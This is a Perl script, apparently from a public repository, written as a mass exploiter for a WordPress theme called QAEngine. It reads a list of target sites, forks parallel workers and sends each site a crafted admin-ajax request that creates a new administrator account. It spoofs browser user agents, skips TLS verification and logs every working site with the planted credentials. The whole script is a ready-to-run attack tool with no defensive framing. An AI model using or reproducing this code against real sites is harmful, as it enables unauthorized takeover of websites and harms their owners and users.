#!/usr/bin/perl
# install parallel::forkmanager module sudo apt-get install libparallel-forkmanager-perl
# or cpan Parallel::ForkManager 
# @version 1.0
# @author M-A
# @link https://raw.githubusercontent.com/mranarshit/wp-Up_exp/master/qaengine.pl
# Perl Lov3r :)
use LWP::UserAgent;
use Getopt::Long;
use Parallel::ForkManager;


my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
our($list,$wordlist,$thread); 
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}

GetOptions(
    'url|u=s' => \$list,
    'wordlist|w=s' => \$log,
    'threads|t=i'	=> \$thread,
) || &flag();

if(!defined($list) || !defined($log) || !defined($thread) ){
	&flag();
}

print "[+] Started : $datestring\n";

open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test upload\n\n"; 

my $pm = new Parallel::ForkManager($thread);# preparing fork
foreach my $web (@site){#loop => working
    my $pid = $pm->start and next;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
    my $user = Generate_user();
    my $pass = Generate_user();
    expadd($web,$user,$pass);
    $pm->finish;
}
$pm->wait_all_children();

sub expadd{
    my ($url,$user,$pass) = @_;
    my $useragent = randomagent();#Get a Random User Agent 
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept 
    $ua->timeout(10);
    $ua->agent($useragent);
    my $path = "/wp-admin/admin-ajax.php?action=ae-sync-user&method=create&user_login=".$user."&user_pass=". $pass ."&role=administrator";  
    my $target = $url.$path;
    my $response = $ua->get($target);
    if ($response->content=~/success\":true/){
        print "\n[*] $url \n";
        print "[OK] New Admin Successfuly Created \n";
        print "| User : $user \n";
        print "| Pass : $pass \n";
        save ($log,"$url : ($user:$pass)");
    }
    else {print "\n[*] $url \n";print "[+] Error Creating New User \n";}

}
sub flag {
    print "\n[+] WP QAEngine Theme R3m0t3 C0d3 Ex3cut10n (Add WP Admin) Exploiter \n[*] Coder => M-A\n";
    print "[+] Usage :\n";
    print "\t-u | urllist  (List of websites)\n";
    print "\t-w | logfile (Log file to save ressults)\n";
    print "\t-t | threads (Number of Thread)\n\n";
}
sub Generate_user {
my $rndstr = rndstr(6, 1..9, 'a'..'z');
sub rndstr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
}
sub save {
    my ($file,$item) = @_;
    open(SAVE,">>".$file);
    print SAVE $item."\n";
    close(SAVE);
}
